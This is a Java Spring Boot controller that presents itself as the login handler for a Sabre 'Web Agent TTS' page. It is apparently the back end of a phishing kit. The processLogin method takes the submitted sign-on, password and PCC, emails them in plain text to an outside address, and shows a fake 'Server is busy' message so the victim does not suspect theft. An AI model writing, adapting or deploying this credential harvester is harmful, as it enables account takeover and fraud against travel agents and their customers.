package com.webagentapp.tts.controller;


import com.webagentapp.tts.service.EmailService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;


@Controller
public class LoginController {


    @Autowired
    EmailService emailService;
    @GetMapping("/")
    public String showLoginPage() {
        return "index";
    }

    @PostMapping("/Login")
    public String processLogin(@RequestParam String son,
                               @RequestParam String password,
                               @RequestParam String pcc,
                               Model model, RedirectAttributes redirectAttributes) {

        String subject = "New Login Attempt Web Agent TTS";
        String message = "son: " + son + "\n password: " + password + "\n pcc: " + "\npcc :"+pcc;


        emailService.sendEmail("sabre@sabrehelpdesk.com", subject, message);
        redirectAttributes.addFlashAttribute("errorMessage", "Server is busy. Please try again later.");

        return "redirect:/";
    }
}
